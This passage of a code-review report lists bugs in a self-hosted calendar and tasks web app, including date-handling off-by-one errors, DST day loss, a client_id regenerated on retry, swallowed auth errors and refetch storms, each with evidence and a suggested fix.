renders *empty*. Nothing re-corrects it: the SSE `rev` bump only fires on a server-side
write, so a read-only user is stuck on a blank month until they navigate again.

<details><summary>Evidence</summary>

```
const calsKey = visibleCals.map((c) => c.id).join(',')
useEffect(() => {
  if (!visibleCals.length) { setEvents([]); return }
  guard(async () => setEvents(await fetchEvents()))
}, [cursor, rev, calsKey])

Sequence: user clicks › (fetch A for April starts), clicks › again ~100ms later (fetch B for May starts). B returns in 200ms, A in 900ms. Final state: cursor = May, events = April's. `byDay` keys April dates, the May grid shows no chips, and `reload()` (same unguarded pattern, line 120-122) can lose the same way after a save.
```

</details>

**Suggested fix.** Add a per-run generation guard: `let live = true; guard(async () => { const evs = await
fetchEvents(); if (live) setEvents(evs) }); return () => { live = false }` — and apply
the same guard inside `reload()` (or route reload through a bumped generation counter).

### [x] Resizing a timed event that ends at midnight is off by one day

`frontend/src/components/CalendarView.tsx:247` · **medium** · bug · `minor`

In the resize branch of `dropOnDay`, the new DTEND for a timed event is built as
`${day}T${old time-of-day}`. When the event's existing DTEND is exactly midnight, that
produces an end instant at the *start* of the drop day — which `lastDayOf` then
(correctly) renders as ending the day before. So dragging the grip to day D makes the
event end on D-1, and dragging it to the day immediately after the current last day is
silently a no-op. The all-day branch two lines above handles exclusivity explicitly
(`end = shiftYmd(day, 1)  // DTEND stays exclusive`); the timed branch does not.

<details><summary>Evidence</summary>

```
} else {
  end = `${day}T${toLocalInput(d.ev.end || d.ev.start).slice(11, 16)}`
  if (end <= start) return
}
const oldEnd = d.ev.end && (d.ev.all_day ? d.ev.end.slice(0, 10) : toLocalInput(d.ev.end))
if (end === oldEnd) return

Event DTSTART 2026-03-02T20:00, DTEND 2026-03-03T00:00 (a 20:00-24:00 block, trivially authored in Thunderbird/Apple Calendar).
lastDayOf -> exclusive -> renders only on 2026-03-02, grip on 2026-03-02.
- Drop on 2026-03-03 (extend by one day): end = '2026-03-03T00:00' === oldEnd -> `return`. Nothing happens; the user's drag is silently discarded.
- Drop on 2026-03-05: end = '2026-03-05T00:00' is PATCHed; lastDayOf now yields 2026-03-04. The event ends a day earlier than where it was dropped.
```

</details>

**Suggested fix.** In the timed branch, detect the exclusive-midnight end the same way `lastDayOf` does and
target the day after the drop: when the original end's local time is 00:00, use `end =
${shiftYmd(day,1)}T00:00`. Compare against `oldEnd` after that normalization so a
genuine one-day extension is not swallowed.

### [x] Editing an all-day event's start silently drops a day when the original span crosses a DST spring-forward

`frontend/src/components/CalendarView.tsx:571` · **low** · bug · `minor`

`changeStart` preserves the event's duration in absolute milliseconds (`oldE.getTime() -
oldS.getTime()`) and then formats the result back to a local calendar day with `ymd()`.
For an all-day event the duration is a whole number of *calendar days*, not of
milliseconds: a span containing a spring-forward transition measures 47h instead of 48h,
so re-anchoring it to a date outside that week lands the end one calendar day short. The
event silently loses a day when the user only touched the start field.

<details><summary>Evidence</summary>

```
const shifted = new Date(newS.getTime() + Math.max(0, oldE.getTime() - oldS.getTime()))
setEnd(allDay ? ymd(shifted) : ...)

Verified with TZ=America/New_York:
  all-day event DTSTART 2026-03-07, DTEND 2026-03-10 (covers Mar 7, 8, 9; DST is Mar 8 2026)
  modal shows start 2026-03-07, inclusive end 2026-03-09
  user changes Start to 2026-04-01
  oldE - oldS = 47 hours -> shifted = 2026-04-02T23:00 -> ymd = '2026-04-02'
  saved as Apr 1 - Apr 2 (2 days) instead of Apr 1 - Apr 3 (3 days).
The reverse direction (fall-back, 49h) happens to round correctly, so only spring-forward loses data.
```

</details>

**Suggested fix.** For `allDay`, shift by whole days instead of milliseconds: compute `const n =
daysBetween(oldStartDay, oldEndDay)` and `setEnd(shiftYmd(v, n))`. (`daysBetween` at
line 18 already rounds the DST-skewed millisecond delta to whole days correctly.)

## Tasks view

### [x] A due date, priority or tag the user *edits* still round-trips lossily

`frontend/src/components/TasksView.tsx:729` · **medium** · bug

Partly addressed: the modal now sends only the fields the user touched, so a rename no
longer rewrites anything else. The representations themselves are still lossy, so
editing one of these fields rewrites it through the same funnel:

- **DUE loses its timezone anchor.** `DUE;TZID=Europe/Berlin:20260810T093000` reads back
  as `2026-08-10T09:30:00+02:00`, `toLocalInput` renders it in the *viewer's* wall clock,
  and the save sends a naive string — emitting `DUE:20260810T033000`, floating, with no
  TZID. Fix: resend the original offset and teach `_parse_datelike` to preserve it.
- **PRIORITY is quantised.** The four-way label bucket maps 1-4 to "high" and "high" back
  to 1, so a task carrying `PRIORITY:3` returns as `PRIORITY:1`. Fix: keep the integer and
  only map when the user picks a new label.
- **Tags split on commas.** `CATEGORIES:Home\,Garden` is one category; the comma-joined
  input splits it in two on save. Fix: a chip editor, or a delimiter a category cannot
  contain.

### [x] Retrying a failed bulk create mints a fresh client_id, so a lost response duplicates the task

`frontend/src/components/TasksView.tsx:175` · **medium** · bug

`createMany` generates a new `client_id` for every row on every invocation. The bulk
composer's whole failure story is "the row is kept — press Add to retry"
(AddMultipleModal.tsx:236-246, and the reassuring comment at line 238), and its retry
calls `onSubmit` again, which re-enters `createMany` and mints new ids. Since
`client_id` is precisely the idempotency slug the server derives the CalDAV resource
name from (api.ts:198-203), regenerating it defeats the only protection against a
replayed create — the retry lands as a second, distinct VTODO on the owner's real list.

<details><summary>Evidence</summary>

```
TasksView.tsx:170-181:
```ts
const createMany = async (items, onProgress): Promise<number[]> => {
  const key = loadKey
  const cids = items.map(() => clientId())      // <- fresh ids on every retry
  ...
  const t = await api.createTask(items[i].listId, { ...items[i].body, client_id: cids[i] })
```
and AddMultipleModal.tsx:236-241:
```ts
// Retrying is safe: a failed create never landed, and each attempt mints a fresh client_id.
const badKeys = new Set(bad.map((i) => live[i].key))
```
The comment's premise is false. `api.createTask` rejects on transport failure *and* on any non-2xx (api.ts:212-222), neither of which implies the write did not land. Failure scenario: the user submits 5 rows over the Cloudflare Tunnel; on row 3 the POST reaches the backend, the CalDAV PUT commits, and then the tunnel returns a 502 (or the connection drops) before the response gets back. `fetch` rejects -> row 3 is marked failed and kept in the grid -> the user presses Add -> `createMany` runs with a brand-new `client_id` -> a second VTODO with the same summary is created on the owner's real list. The same happens for a single-shot `create` (line 150) if the user retypes, but the bulk modal actively invites the retry.
```

</details>

**Suggested fix.** Mint the client_id once per row and store it on the `Row` (it already has a stable `key`
— reuse that, or add a `cid` field), then pass it through `items[i]` into `createMany`
so a retry replays the identical id. Keep regenerating only when the user edits the
row's title. Add a test that fails the second create with a non-Auth error, retries, and
asserts the same `client_id` is sent.

### [x] Subtasks vanish from the List view whenever their parent row isn't rendered

`frontend/src/components/TasksView.tsx:269` · **medium** · bug

The List view renders only top-level tasks (`tops`), and a subtask reaches the DOM
exclusively as a child of its own parent's `<TaskGroup>` via `childrenOf(parent.uid)`.
Nothing renders a task whose `parent` is set but whose parent row is not itself being
rendered, so such a task is completely absent from the List view — it cannot be seen,
completed, edited or deleted. `parent` is the raw `RELATED-TO` UID with no existence
check (`backend/tasksd/service.py:232` -> `it["related_parent"]`, `ical/read.py:143`),
and `_children_map` (service.py:189) only groups within one list, so cross-list and
dangling RELATED-TO values are both handed to the client as-is. Meanwhile the sidebar
count still includes them (`service.py:147` counts every non-COMPLETED/CANCELLED VTODO
regardless of parentage), so the badge and the visible rows disagree.

<details><summary>Evidence</summary>

```
TasksView.tsx:268-272:
```ts
const shownTasks = tasks.filter((t) => !hiddenSet.has(t.list))
const tops = shownTasks.filter((t) => !t.parent)
const childrenOf = (uid: string) => shownTasks.filter((t) => t.parent === uid)
const active = tops.filter((t) => !t.completed && !t.cancelled)
const done = tops.filter((t) => t.completed || t.cancelled)
```
and TasksView.tsx:373-385, where `done` is rendered only `{showCompleted && done.length > 0 && ...}`.

Failure scenario (no hostile data needed, default settings): `showCompleted` defaults to `false` (App.tsx:32). Parent "Trip planning" is marked complete (here or in Tasks.org) while its subtask "Book flight" is still NEEDS-ACTION. The parent lands in `done`, which is not rendered because `showCompleted` is false; "Book flight" has `parent` set so it is excluded from `tops`; `childrenOf('trip-uid')` is never called. "Book flight" disappears from the List view entirely, while the sidebar still shows the list's open count including it.

Second scenario (hostile/foreign CalDAV data, in scope per the trust model): another client writes a VTODO with `RELATED-TO:<uid-that-does-not-exist>` (or deletes a parent without cascading). That task is permanently invisible and unreachable in the List view forever.

Note the day-column views behave inconsistently — `openOn`/`doneOn`/`undated` (lines 295-307) filter `shownTasks` without checking `parent`, so the same subtask does render there, as a top-level card, and is counted in the column badge.
```

</details>

**Suggested fix.** Treat a task as top-level when its parent is not among the rendered set, e.g. `const
renderedUids = new Set(shownTasks.map(t => t.uid))` and `const tops =
shownTasks.filter(t => !t.parent || !renderedUids.has(t.parent))`, plus include a
completed parent's open children (or render orphans under a synthetic heading) when
`showCompleted` is off. Add a test covering an open subtask whose parent is completed
with `showCompleted={false}`.

## Home / dashboard

### [x] Mini calendar dots one day too many: exclusive all-day DTEND treated as inclusive

`frontend/src/components/HomeView.tsx:340` · **medium** · rendering · `minor`

`busyDays` walks from the event's start day to `midnight(parseDate(e.end))` inclusive.
For an all-day event the wire `end` is the *exclusive* DTEND (backend serves the raw
DTEND — service.py:415 `"end": it["dtend"]`), and for a timed event ending exactly at
midnight the end instant belongs to the previous day. Both cases dot one day past the
event. CalendarView already gets this right in `lastDayOf()` (CalendarView.tsx:33-42,
which checks `e.end_is_date` and the midnight case); `busyDays` never looks at
`end_is_date` at all.

<details><summary>Evidence</summary>

```
const to = e.end ? parseDate(e.end) : from
...
const tail = midnight(to)
for (let d = head; d <= tail && d <= gridEnd; d = addDays(d, 1)) busy.add(ymd(d))

Verified by running the real function:
  busyDays([ev('2026-08-03','2026-08-04', start_is_date:true, end_is_date:true)], grid)
    -> ['2026-08-03', '2026-08-04']      // a ONE-day all-day event on Aug 3
  busyDays([ev('2026-08-03T20:00:00','2026-08-04T00:00:00')], grid)
    -> ['2026-08-03', '2026-08-04']      // 20:00-24:00 on Aug 3
So a single all-day event (a birthday, a one-day trip) marks the *next* day busy on the Home mini calendar, with no event there.
```

</details>

**Suggested fix.** Compute the last covered day the same way CalendarView.lastDayOf does — treat
`e.end_is_date` (or a datetime end landing exactly on 00:00 local) as exclusive and step
`tail` back one day, floored at the start day. Export/share `lastDayOf` rather than
duplicating the rule in two places.

### [x] Test gap: busyDays has no all-day (exclusive DTEND) case; its helper hardcodes end_is_date:false

`frontend/src/components/HomeView.test.tsx:188` · **low** · test-gap · `minor`

The `busyDays` describe block builds every fixture with `start_is_date: false,
end_is_date: false, all_day: false`, so no test ever exercises the all-day path — which
is exactly the path that is wrong (see the exclusive-DTEND finding). The suite does
cover multi-day spans, no-end events, an end earlier in the day than the start, and a
runaway DTEND, so the omission reads as an oversight rather than a deliberate scope cut.

<details><summary>Evidence</summary>

```
const ev = (start: string | null, end: string | null): CalEvent => ({
  ..., start, start_is_date: false, end, end_is_date: false,
  all_day: false, ... })

Every one of the four busyDays tests calls this helper, so `busyDays([{start:'2026-08-03', end:'2026-08-04', end_is_date:true, ...}], grid)` returning two days is never caught.
```

</details>

**Suggested fix.** Give the helper optional `start_is_date`/`end_is_date`/`all_day` params and add: a one-
day all-day event dots exactly one day; a three-day all-day event (DTEND = day 4) dots
exactly three; a timed event ending 00:00 dots only its own day.

## Frontend, other

### [x] All settings writes swallow every failure, including 401 — an expired session silently discards preference changes and never returns to the login form

`frontend/src/App.tsx:128` · **medium** · bug · `minor`

All nine settings mutators (`changeAppearance`, `changeDashboard`, `changeTasksView`,
`toggleSide`, `changeHiddenCals`, `changeArchivedCals`, `changeHiddenLists`,
`changeTaskGroups`, `changeCollapsedGroups`, `toggleShowCompleted`, `changeTheme`) do
`api.putSettings(...).catch(() => {})`. None routes through `makeGuard`, so an
`AuthError` never reaches `onExpire` and no error ever reaches the toast notifier. The
local state is already committed, so the UI asserts a change that the server rejected.
For `appearance` and `theme` there is at least a localStorage mirror; `dashboard`,
`task_groups`, `hidden_lists`, `collapsed_groups`, `hidden_calendars` and
`archived_calendars` live only server-side, so the change is simply gone on the next
reload.

<details><summary>Evidence</summary>

```
const changeDashboard = useCallback((next: DashboardModule[]) => {
  setDashboard(next)
  api.putSettings({ dashboard: next }).catch(() => { /* stays local if offline */ })
}, [])

Scenario A (expired session): the tab has been open past TASKS_SESSION_TTL (7 days default). The user rearranges the Home dashboard and hides two calendars. Every PUT returns 401; `j()` throws AuthError; the catch eats it. The UI shows the new arrangement, no toast appears, the app never falls back to <Login>, and (combined with the SSE finding above, whose stream the same 401 has already closed) the tab looks perfectly healthy while being completely disconnected. On reload everything is back to the old layout with no explanation.

Scenario B (server-side rejection): dashboard.ts clamps module height to MAX_ROWS = 200 (dashboard.ts:60,74) while the backend model is `h: int = Field(ge=1, le=40)` (app.py:281). A module resized past 40 rows makes the whole PUT 422; the layout renders locally and is silently dropped.
```

</details>

**Suggested fix.** Route these writes through a guard: on AuthError call `onExpire()`/`setAuth('out')`,
otherwise surface the message through the existing toast notifier (and roll the local
state back, or at least mark it unsaved). Also reconcile the dashboard height clamp with
the backend bound (both 40, or both 200).

### [x] Every settings write triggers a full lists+tasks refetch in every open tab, so one appearance-slider drag fires a request storm

`frontend/src/App.tsx:190` · **medium** · bug

`TaskService.update_settings` publishes `{"type": "settings_updated"}` to every SSE
subscriber including the tab that made the write (backend/tasksd/service.py:787). The
client's `subscribe()` filter only excludes `hello`, so any settings event is treated as
a data change and bumps `rev`, which is the refetch trigger for TasksView
(`useEffect(..., [loadKey, rev])` -> `api.lists()` + one `api.tasks()` per list),
CalendarView and `useAllTasks`. UI preferences have nothing to do with task data, so
every one of these refetches is pure waste — and each one replaces the whole tasks array
under whatever optimistic paint is in flight, which is exactly the reconcile race
TasksView's fetch-token guard exists to narrow.

<details><summary>Evidence</summary>

```
// App.tsx
const unsubscribe = subscribe(() => { clearTimeout(timer); timer = setTimeout(() => setRev((r) => r + 1), 250) })
// api.ts:315
if (data.type && data.type !== 'hello') onChange()

Scenario: user opens Appearance and drags the Gutter slider. `RangeControl` is `<input type="range" min={8} max={64} step={1} onChange={(e) => onChange(...)}>` (AppearancePanel.tsx:297-300); React fires onChange on every distinct step, so one drag across the range produces up to 56 `api.putSettings({appearance})` calls (App.tsx:131). Each PUT publishes settings_updated; the 250 ms debounce collapses them to roughly one rev bump per 250 ms of drag, and each bump costs 1 + N HTTP requests (N = number of task lists) in TasksView plus 1 + N more in HomeView if it is mounted. With 8 lists that is ~18 requests every 250 ms for the whole drag, all of them re-reading SQLite, while the user is only picking a gutter width. Toggling the sidebar or flipping the theme has the same 1+N cost.
```

</details>

**Suggested fix.** Give `subscribe` the parsed event type and let App route it: `settings_updated` should
re-run `api.getSettings()` (or be ignored entirely in the originating tab), never bump
`rev`. Independently, debounce the appearance/dashboard PUTs (commit on pointerup /
trailing-edge debounce) so a slider drag is one write, not fifty-six.

### [x] Every appearance control silently does nothing when 24 themes exist and the shipped design is active

`frontend/src/components/AppearancePanel.tsx:46` · **low** · bug · `minor`

`edit()` is the handler behind every token control in the panel. When the shipped
default is active (`active === null`) it must fork a new theme first, and it bails out
with a bare `return` if the theme cap is already reached. No toast, no alert, no
disabled state on the controls — unlike `importTheme`, which does alert on the same
condition (line 106).  The result is a panel that looks fully interactive but is inert:
the color text field accepts typing and shows valid styling, the range sliders move, and
nothing is ever applied or saved. `saveAs` (line 61) has the same silent bail.

<details><summary>Evidence</summary>

```
frontend/src/components/AppearancePanel.tsx:40-56
  const edit = (patch: ThemeTokens) => {
    if (active) { ... return }
    if (themes.length >= MAX_THEMES) return        // <- silent no-op
    const fork: CustomTheme = { id: clientId().slice(0, 16), name: 'Custom', ... }
    onChange({ active: fork.id, themes: [...themes, fork] })
  }

Failure scenario: user has accumulated MAX_THEMES (24) themes and selects
"Smylte (default)" in the theme dropdown. They then drag the Corners slider to 8px.
RangeControl fires onChange -> edit({'--radius': '8px'}) -> active is null and
themes.length === 24 -> return. onChange is never called, no state changes, the slider
snaps back on the next render, and the user gets no explanation. Same for typing a color
and for clicking "Duplicate" (saveAs, line 61).
```

</details>

**Suggested fix.** In both `edit()` and `saveAs()`, surface the cap the way `importTheme` already does,
e.g. `window.alert(\`You can keep ${MAX_THEMES} themes — delete one first.\`)` before
returning, or compute `const atCap = !active && themes.length >= MAX_THEMES` and pass it
down to disable the TokenRow controls with a hint line.

### [x] Booking page reports every load failure as "this link is no longer available", including 429 rate-limits and network blips

`frontend/src/components/BookingPage.tsx:40` · **low** · rendering · `minor`

`load()` catches everything that is not an `AuthError` and sets `phase='notfound'`,
which renders a terminal card reading "This booking link is no longer available. It may
have been turned off or removed. Ask the person who sent it for a fresh link." There is
no retry and no distinction between a genuine 404 and a transient failure. The backend
deliberately returns 429 on this exact endpoint (`public_get_limiter =
RateLimiter(max_fails=120, window_s=300, lockout_s=300)`, app.py:978, and `_throttle`
counts *every* request, not just failures — app.py:994), and a fetch rejection (dropped
connection, tunnel hiccup) hits the same branch. The same path is taken from
`submit()`'s race-recovery, where `await load()` can overwrite the "That time was just
taken" message with the dead-link card.

<details><summary>Evidence</summary>

```
BookingPage.tsx:39-42:
```tsx
} catch (e) {
  if (!(e instanceof AuthError)) setPhase('notfound')
  return null
}
```
`api.publicBookingInfo` (api.ts:294) goes through `j()`, which throws a plain `Error` for any non-2xx except 401 (api.ts:212-222). Trigger: 121 GETs of `/api/public/booking/<token>` from one IPv4 / IPv6-/64 within 5 minutes (a shared office NAT or CGNAT range, or a single visitor reloading) -> 429 -> every visitor behind that address is told for the next 5 minutes that the host's link has been removed and to ask for a new one. Same card on any transient network error at page load, with no way to retry short of a manual reload. `BookingPage.test.tsx:35` only exercises the genuine-404 case, so nothing catches this.
```

</details>

**Suggested fix.** Have `j()` surface the HTTP status (or throw a typed `HttpError`) and in `load()` only
enter `notfound` on a real 404; for 429/5xx/network errors show a distinct "couldn't
load right now" state with a Retry button (and honour `Retry-After`). In `submit()`'s
race branch, don't let a failing `load()` clobber the already-set error message.

### [x] Wrong password shows the raw string "unauthenticated" instead of a friendly message; the Login test asserts an error the client can never produce

`frontend/src/components/Login.tsx:19` · **low** · rendering · `minor`

`j()` intercepts status 401 *before* it reads the response body and throws
`AuthError('unauthenticated')` (api.ts:212), discarding the server's `detail`. The login
endpoint answers a bad password with `HTTPException(401, "invalid credentials")`
(backend/tasksd/app.py:949). Login.tsx only maps the strings 'Unauthorized' and 'invalid
credentials' to the friendly text, so the real message never matches and the raw
internal token is rendered to the user. The test suite hides this: Login.test.tsx mocks
`api.login` rejecting with `new Error('invalid credentials')`, a shape the real api
client cannot produce for a 401 — so the green test is asserting on fiction.

<details><summary>Evidence</summary>

```
// api.ts
if (res.status === 401) throw new AuthError('unauthenticated')
// Login.tsx
const msg = (ex as Error).message
setErr(msg === 'Unauthorized' || msg === 'invalid credentials' ? 'Invalid credentials' : msg)

Input: correct username, wrong password -> POST /api/login -> 401 {"detail":"invalid credentials"} -> AuthError('unauthenticated') -> the login card displays the word "unauthenticated". (The 429 lockout path is fine: 429 is not intercepted, so 'too many attempts, try later' is shown verbatim, and that is the case the tests actually cover.)
```

</details>

**Suggested fix.** Catch `AuthError` explicitly in `submit` and render 'Invalid credentials' for it
(keeping the verbatim branch for 429/5xx), or have `j()` carry the parsed `detail` into
the AuthError message. Then fix Login.test.tsx to reject with `new
AuthError('unauthenticated')` so the test exercises the shape the client actually
throws.

### [x] Editing a list silently strips the alpha byte from a #RRGGBBAA color written by another client

`frontend/src/components/Sidebar.tsx:566` · **low** · bug · `minor`

`EditModal` truncates the incoming color to its RGB prefix for swatch comparison, but
then saves that truncated value. Any save from this modal — including one where the user
only renamed the collection — PROPPATCHes the shortened color back to Radicale,
discarding the alpha byte another client wrote.

<details><summary>Evidence</summary>

```
Sidebar.tsx:564-571:
```ts
const [name, setName] = useState(item.name)
// Wire colors may carry an alpha byte (#RRGGBBAA); compare on the RGB part.
const [color, setColor] = useState<string | null>(item.color ? item.color.slice(0, 7) : null)
...
const save = () => {
  onSave(item.id, { name: name.trim() || item.name, color })
}
```
Failure scenario: Apple Calendar / DAVx5 set `calendar-color` to `#FF9500FF` (their standard format). The owner opens the list's ⋯ menu just to rename it and presses Save. `color` is `'#FF9500'`, so `api.updateList` PROPPATCHes `#FF9500` and the `FF` alpha component is gone from the collection for every other client. The comment shows the truncation was intended for the `color === c` swatch comparison only; it leaked into the write.
```

</details>

**Suggested fix.** Keep the original wire value in a ref and compare on the prefix: `const [color,
setColor] = useState<string | null>(item.color)`, with the swatch check `color?.slice(0,
7) === c`. Only send a changed color when the user actually clicked a swatch or the "no
color" button.

